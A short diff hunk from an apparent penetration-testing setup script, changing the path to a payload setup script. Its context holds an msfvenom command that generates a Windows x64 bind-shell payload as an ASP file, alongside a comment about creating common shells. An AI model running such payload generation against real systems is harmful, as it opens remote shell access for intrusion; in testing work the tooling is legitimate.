@@ -22,6 +22,6 @@ cd payloads_windows
   msfvenom -p windows/x64/shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f asp > shell_bind_tcp_x64.asp
 
   # Create all common shells in payloads_windows folder
-  bash setup_payloads.sh
+  bash ../_setup/setup_payloads.sh
 
 cd -
